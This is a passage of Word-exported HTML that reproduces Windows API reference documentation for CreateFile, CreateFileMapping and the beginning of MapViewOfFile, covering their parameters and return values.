mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPSECURITY_ATTRIBUTES lpSecurityAttributes, // pointer to sec.
attrib.<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD dwCreationDistribution,<span style="mso-spacerun: yes">      
</span>// how to create<span style="mso-spacerun: yes">                   
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span></span><span lang=FR style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF;mso-ansi-language:FR'>DWORD dwFlagsAndAttributes,
// file attributes<span style="mso-spacerun: yes">                         
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun: yes">    
</span></span><span lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF;mso-ansi-language:EN-US'>HANDLE hTemplateFile<span
style="mso-spacerun: yes">        </span>// handle to file with attributes to
copy<span style="mso-spacerun: yes">   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpFileName: Points to a null-terminated string that specifies the name
of the object (file, pipe, mailslot, communications resource, disk<span
style="mso-spacerun: yes">  </span>device, console, or directory) to create or
open.<span style="mso-spacerun: yes">  </span>If *lpFileName is a path, there
is a default string size limit of<span style="mso-spacerun: yes"> 
</span>MAX_PATH characters. This limit is related to how the CreateFile<span
style="mso-spacerun: yes">        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>function parses paths.<span style="mso-spacerun:
yes">                                                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwDesiredAccess: Specifies the type of access to the object. An
application can obtain read access, write access, read-write access,or<span
style="mso-spacerun: yes">  </span>device query access.<span
style="mso-spacerun: yes">                                                   
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwShareMode: Set of bit flags that specifies how the object can be
shared. If dwShareMode is 0, the object cannot be shared. Subsequent<span
style="mso-spacerun: yes">  </span>open operations on the object will fail,
until the handle is closed.<span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                        </span><span
style="mso-spacerun: yes">                     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpSecurityAttributes: Pointer to a SECURITY_ATTRIBUTES structure that
determines whether the returned handle can be inherited by child processes. If
lpSecurityAttributes is NULL, the handle cannot be inherited.<span
style="mso-spacerun: yes">                    </span><span style="mso-spacerun:
yes">                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwCreationDistribution: Specifies which action to take on files that
exist, and which action to take when files do not exist.<span
style="mso-spacerun: yes">      </span><span style="mso-spacerun:
yes">          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwFlagsAndAttributes: Specifies the file attributes and flags for
the<span style="mso-spacerun: yes">  </span>file.<span style="mso-spacerun:
yes">                                                                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                   </span><span style="mso-spacerun:
yes">                                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>hTemplateFile:Specifies a handle with GENERIC_READ access to a template
file.The template file supplies file attributes and extended attributes for the
file being created. Windows 95: This value must be NULL. If<span
style="mso-spacerun: yes">    </span>you supply a handle under Windows 95, the
call fails and GetLastError returns ERROR_NOT_SUPPORTED.<span
style="mso-spacerun: yes">                                            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>If the function succeeds, the return value is an open handle to the<span
style="mso-spacerun: yes">  </span>specified file. If the specified file exists
before the function call and dwCreationDistribution is CREATE_ALWAYS or OPEN_ALWAYS,
a call to GetLastError returns ERROR_ALREADY_EXISTS (even though the function
has succeeded). If the file does not exist before the call, GetLastError<span
style="mso-spacerun: yes">  </span>returns zero.<span style="mso-spacerun:
yes">                                                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function fails, the return value is INVALID_HANDLE_VALUE.To get
extended error information, call GetLastError.<span style="mso-spacerun:
yes">                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>----------------------------------------------------------------------------------------------<span
style="mso-spacerun: yes">                            </span><span
style="mso-spacerun: yes">                                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>The CreateFileMapping function creates a named or unnamed file-mapping
object for the specified file.<span style="mso-spacerun:
yes">                                            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                               </span><span
style="mso-spacerun: yes">              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>HANDLE CreateFileMapping(<span style="mso-spacerun:
yes">                                                 </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>HANDLE hFile,<span style="mso-spacerun: yes">       </span>// handle to
file to map<span style="mso-spacerun: yes">                            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPSECURITY_ATTRIBUTES lpFileMappingAttributes, // optional
sec.attribs<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD flProtect,<span style="mso-spacerun: yes">    </span>// protection
for mapping object<span style="mso-spacerun: yes">                    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD dwMaximumSizeHigh,<span style="mso-spacerun: yes">    </span>//
high-order 32 bits of object size<span style="mso-spacerun: yes">       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD dwMaximumSizeLow,<span style="mso-spacerun: yes">     </span>//
low-order 32 bits of object size<span style="mso-spacerun: yes">        
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPCTSTR lpName<span style="mso-spacerun: yes">      </span>// name of
file-mapping object<span style="mso-spacerun: yes">                     
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                      </span><span style="mso-spacerun:
yes">                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>hFile: Identifies the file from which to create a mapping object. The
file must be opened with an access mode compatible with the protection flags
specified by the flProtect parameter. It is recommended, though<span
style="mso-spacerun: yes">  </span>not required, that files you intend to map
be opened for exclusive<span style="mso-spacerun: yes">  </span>access.<span
style="mso-spacerun:
yes">                                                                 </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>If hFile is (HANDLE)0xFFFFFFFF, the calling process must also specify a
mapping object size in the dwMaximumSizeHigh and dwMaximumSizeLow
parameters.The function creates a file-mapping object of the specified size
backed by the operating-system paging file rather than by a named<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>file in the file system. The file-mapping object can be shared through
duplication, through inheritance, or by name.<span style="mso-spacerun:
yes">                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpFileMappingAttributes: Pointer to a SECURITY_ATTRIBUTES structure that
determines whether the returned handle can be inherited by child processes. If
lpFileMappingAttributes is NULL, the handle cannot be inherited.<span
style="mso-spacerun:
yes">                                                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>flProtect: Specifies the protection desired for the file view, when the
file is mapped.<span style="mso-spacerun:
yes">                                                         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwMaximumSizeHigh: Specifies the high-order 32 bits of the maximum size
of the file-mapping object.<span style="mso-spacerun:
yes">                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwMaximumSizeLow: Specifies the low-order 32 bits of the maximum size of
the file-mapping object. If this parameter and dwMaximumSizeHig are zero, the
maximum size of the file-mapping object is equal to the current size of the
file identified by hFile.<span style="mso-spacerun:
yes">                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                 </span><span
style="mso-spacerun: yes">                            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpName: Points to a null-terminated string specifying the name of the
mapping object.The name can contain any character except the backslash
character (\).<span style="mso-spacerun: yes">                                                         
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>If this parameter matches the name of an existing named mapping object,
the function requests access to the mapping object with the protection
specified by flProtect.<span style="mso-spacerun:
yes">                                                 </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>If this parameter is NULL, the mapping object is created without a
name<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                                    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function succeeds, the return value is a handle to the file-mapping
object. If the object existed before the function call, the GetLastError
function returns ERROR_ALREADY_EXISTS, and the return<span style="mso-spacerun:
yes">      </span>value is a valid handle to the existing file-mapping object
(with its current size, not the new specified size. If the mapping object did
not exist, GetLastError returns zero.<span style="mso-spacerun:
yes">                                       </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function fails, the return value is NULL. To get extended
error<span style="mso-spacerun: yes">  </span>information, call
GetLastError<span style="mso-spacerun:
yes">                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>----------------------------------------------------------------------------------------------<span
style="mso-spacerun:
yes">                                                                      
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>The MapViewOfFile function maps a view of a file into the address
space<span style="mso-spacerun: yes">  </span>of the calling process.<span
style="mso-spacerun: yes">                                                  
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>LPVOID MapViewOfFile(<span style="mso-spacerun:
yes">                                                     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>HANDLE hFileMappingObject,<span style="mso-spacerun: yes">  </span>//
file-mapping object to map<span style="mso-spacerun: yes">              
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD dwDesiredAccess,<span style="mso-spacerun: yes">      </span>//
access mode<span style="mso-spacerun: yes">                             
</span><o:p></o:p></span></p>

